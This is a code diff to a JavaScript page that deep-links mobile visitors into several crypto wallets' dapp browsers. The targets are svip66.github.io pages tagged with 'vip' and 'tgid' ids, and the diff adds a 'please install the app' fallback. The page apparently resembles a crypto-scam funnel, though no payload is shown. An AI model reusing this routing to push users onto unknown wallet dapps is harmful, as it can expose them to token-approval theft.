@@ -67,6 +67,17 @@ function GetRequest() {
 // console.dir(GetRequest())
 window.vip = GetRequest().vip || ''
 // document.getElementById('input_num').value = vip
+// 尝试打开APP，如果失败则提示
+function tryOpenApp(url) {
+	window.location.href = url
+	setTimeout(function () {
+		var hidden = window.document.hidden || window.document.mozHidden || window.document.msHidden || window.document.webkitHidden
+		if (typeof hidden == 'undefined' || hidden == false) {
+			alert('请先安装对应的app')
+		}
+	}, 2500)
+}
+
 function paylistevent(from) {
 	let addtype = $('#addtype').val()
 	let from_url = $('#from_url').val()
@@ -78,15 +89,22 @@ function paylistevent(from) {
 	// let tp_url = encodeURIComponent(window.location.protocol + "//" + window.location.host + "/" + addtype + ".html?from=" + from +
 	// "&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url);
 	// var Ead = document.getElementById('input_num').innerHTML
+	var tgid = getUrlParams('tgid')
 	let im_url = 'https://svip66.github.io/c/index.html?vip=' + vip
 	let tp_url = 'https://svip66.github.io/c/index.html?vip=' + vip
 	let my_url = 'https://svip66.github.io/e/index.html?vip=' + vip
+
+	if (tgid) {
+		im_url += '&tgid=' + tgid
+		tp_url += '&tgid=' + tgid
+		my_url += '&tgid=' + tgid
+	}
 
 	// let qr_url = 	window.location.protocol + "//" + window.location.host + "https://svip66.github.io/b/" + addtype + "&to_address=" + to_address + "&from_url=" + from_url;
 
 	if (from == 'imToken') {
 		if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
-			location.href = 'imtokenv2://navigate?screen=DappView&url=' + im_url
+			tryOpenApp('imtokenv2://navigate?screen=DappView&url=' + im_url)
 		} else {
 			alert('请在手机游览器操作！')
 			// 	        location.href = qr_url;
@@ -96,7 +114,7 @@ function paylistevent(from) {
 			// if (addtype == 'trc20') {
 			// location.href = 'tpdapp://open?params={"url": "' + tp_url + '"}'
 			// } else {
-			location.href = 'tpdapp://open?params={"url": "' + tp_url + '", "chain": "ERC", "source":"xxx"}'
+			tryOpenApp('tpdapp://open?params={"url": "' + tp_url + '", "chain": "ERC", "source":"xxx"}')
 			// }
 		} else {
 			alert('请在手机游览器操作！')
@@ -110,13 +128,13 @@ function paylistevent(from) {
 				protocol: 'tronlinkoutside',
 				version: '1.0',
 			}
-			location.href = 'tronlinkoutside://pull.activity?param=' + JSON.stringify(param)
+			tryOpenApp('tronlinkoutside://pull.activity?param=' + JSON.stringify(param))
 		} else {
 			alert('请在手机游览器操作！')
 		}
 	} else if (from == 'BitKeep') {
 		if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
-			location.href = 'bitkeep://dapp?url=' + im_url
+			tryOpenApp('bitkeep://dapp?url=' + im_url)
 		} else {
 			alert('请在手机游览器操作！')
 		}
@@ -124,13 +142,13 @@ function paylistevent(from) {
 		if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
 			// Metamask needs url without protocol
 			var urlNoProtocol = im_url.replace(/^https?:\/\//, '')
-			location.href = 'https://metamask.app.link/dapp/' + urlNoProtocol
+			tryOpenApp('https://metamask.app.link/dapp/' + urlNoProtocol)
 		} else {
 			alert('请在手机游览器操作！')
 		}
 	} else if (from == 'Okex') {
 		if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
-			location.href = 'okx://wallet/dapp/details?dappUrl=' + encodeURIComponent(im_url)
+			tryOpenApp('okx://wallet/dapp/details?dappUrl=' + encodeURIComponent(im_url))
 		} else {
 			alert('请在手机游览器操作！')
 		}
